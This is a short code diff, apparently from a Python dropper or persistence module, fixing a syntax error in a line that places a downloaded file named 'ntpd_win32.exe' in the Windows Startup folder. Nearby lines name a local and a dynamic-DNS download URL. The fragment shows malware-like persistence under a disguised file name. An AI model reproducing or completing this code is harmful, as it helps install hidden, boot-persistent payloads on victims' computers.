@@ -40,7 +40,7 @@ def run(**args):
       url = "http://192.168.2.112:8000/nj"   #"http://saw-dsr.ddns.net:8000/nj"
       OsTargetpath = "ntpd_win32.exe"
       if winRunOnBoot == True:
-          OsTargetpath = = os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup\\"+ OsTargetpath
+          OsTargetpath = os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup\\"+ OsTargetpath
 
     elif os.name == 'posix':
       bin = False
